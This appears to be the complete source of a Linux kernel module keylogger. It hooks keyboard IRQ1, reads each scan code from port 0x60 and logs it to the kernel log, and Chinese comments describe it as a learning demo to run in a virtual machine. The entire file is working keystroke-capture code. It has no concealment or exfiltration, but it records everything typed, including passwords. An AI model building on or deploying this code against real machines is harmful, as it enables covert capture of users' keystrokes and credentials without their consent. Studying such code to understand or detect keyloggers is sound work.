/*
 * keylog_irq.c - Hook keyboard IRQ1 to log every keystroke
 *
 * WARNING: 仅供学习演示，请在虚拟机中测试。
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/io.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Demo");
MODULE_DESCRIPTION("Log every keyboard scan code via IRQ1 hook");
MODULE_VERSION("1.0");

static char *dev_id = "keylogger";

/* IRQ1 的中断号就是 1 */
static irqreturn_t keylog_irq_handler(int irq, void *dev)
{
    unsigned char scancode;

    /* 从键盘控制器端口读取扫描码 */
    scancode = inb(0x60);
    printk(KERN_INFO "[keylog] scancode: 0x%02x\n", scancode);

    /* 不阻止其他共享此 IRQ 的处理器 */
    return IRQ_NONE;
}

static int __init keylog_init(void)
{
    int ret;

    /* 请求共享 IRQ1 */
    ret = request_irq(1,                   /* IRQ 号 */
                      keylog_irq_handler,  /* 处理函数 */
                      IRQF_SHARED,         /* 可共享 */
                      "keylogger",         /* 名称，会显示在 /proc/interrupts */
                      &dev_id);            /* 用于区分共享者 */
    if (ret) {
        printk(KERN_ERR "keylog: request_irq failed (%d)\n", ret);
        return ret;
    }

    printk(KERN_INFO "keylog: IRQ1 handler installed\n");
    return 0;
}

static void __exit keylog_exit(void)
{
    free_irq(1, &dev_id);
    printk(KERN_INFO "keylog: IRQ1 handler removed\n");
}

module_init(keylog_init);
module_exit(keylog_exit);
